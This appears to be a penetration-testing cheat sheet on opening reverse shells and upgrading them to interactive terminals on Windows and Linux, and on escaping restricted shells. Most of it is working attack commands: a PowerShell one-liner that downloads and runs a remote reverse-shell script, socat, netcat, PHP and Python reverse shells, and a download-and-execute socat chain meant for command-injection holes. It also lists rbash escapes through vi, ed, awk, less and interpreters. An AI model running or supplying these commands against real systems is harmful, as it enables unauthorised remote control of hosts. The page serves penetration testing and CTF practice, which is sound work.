# ⭕ Shell Escape / Interactive TTY

## <mark style="color:red;">windows interactive reverse powershell</mark>

{% embed url="https://github.com/antonioCoco/ConPtyShell" %}

#### <mark style="color:green;">Server (attacker) Side:</mark>

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

#### <mark style="color:green;">Client Side (directly load from git repository):</mark>

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 3001
```

#### or, if you upload the ps1:

```
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
```

#### or download the reverse shell and upload it to target yourself

```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
IEX(IWR http://192.168.56.1/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 9999
```

## <mark style="color:red;">Linux Interactive Shell</mark>

### <mark style="color:orange;">check $SHELL and $PATH</mark>

fix the path problem if you cant access default shells

```
export PATH=/bin:/usr/bin:$PATH
```

### <mark style="color:orange;">Using Python & STTY</mark>

#### <mark style="color:green;">In your current non-interactive reverse shell type:</mark>

```
 python -c 'import pty; pty.spawn("/bin/bash")'
```

#### <mark style="color:green;">press Ctrl+z to send the shell to background</mark>

#### <mark style="color:green;">then in the same terminal type in:</mark>

```
echo $TERM >>> take note of terminal name
stty -a >>> take note of raws and columns numbers
stty raw -echo
fg
```

#### <mark style="color:green;">then you will have an empty terminal, type these:</mark>

```
 reset
 export SHELL=bash
 export TERM=xterm-256color  OR export TERM=xterm
stty rows <num> columns <cols>
```

### <mark style="color:orange;">Using /usr/bin/script</mark>

#### <mark style="color:green;">in your current non-interactive reverse shell type in:</mark>

```
 /usr/bin/script -qc /bin/bash /dev/null
```

the rest is like the above method, we just use /usr/bin/script if python is not installed

### <mark style="color:orange;">Using Socat & STTY</mark>

<mark style="color:green;">**attacker:**</mark>

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

<mark style="color:green;">**victim:**</mark>

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

{% embed url="https://github.com/andrew-d/static-binaries" %}

With a command injection vuln, it’s possible to download the correct architecture socat binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## <mark style="color:red;">Semi-interactive Spawn & Escape</mark>

### <mark style="color:orange;">​​rbash escape through SSH</mark>

```
ssh hackNos@<IP-Adress> -t "bash --noprofile"
```

### <mark style="color:orange;">rbash escape through editors</mark>

```
vi
:set shell=/bin/bash
:shell
```

### <mark style="color:orange;">escaping rbash – editor</mark>

```
ed
!'/bin/bash'
pwd
```

### <mark style="color:orange;">escape rbash through reverse shell</mark>

```
nc -lvp 4545
php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### <mark style="color:orange;">rbash escape Awk</mark>

```
awk 'BEGIN {system("/bin/bash")}'
```

### <mark style="color:orange;">interpreters</mark>

```
python -c 'import pty; pty.spawn("/bin/sh");'  
python3 -c 'import os; os.system("/bin/bash");'
perl -e 'exec "/bin/sh";'
ruby -e ‘exec "/bin/sh"’
lua -e 'os.execute('/bin/sh')'
```

### <mark style="color:orange;">rbash bypass through binary file</mark>

```
less anyfile.txt
!'bash'
```

### <mark style="color:orange;">sh</mark>

```
/usr/bin/script -qc /bin/bash /dev/null
echo os.system('/bin/bash')
/bin/sh -i
exec "/bin/sh"
```

### ​​<mark style="color:orange;">within nmap</mark>

```
!sh
```

### <mark style="color:orange;">rlwrap for Making the Shell Semi-interactive</mark>

```
# use with netcat or other shells
rlwrap nc -nvlp 1234
```

### <mark style="color:orange;">in meterpreter</mark>

```
execute -f cmd.exe -H -c -i
```
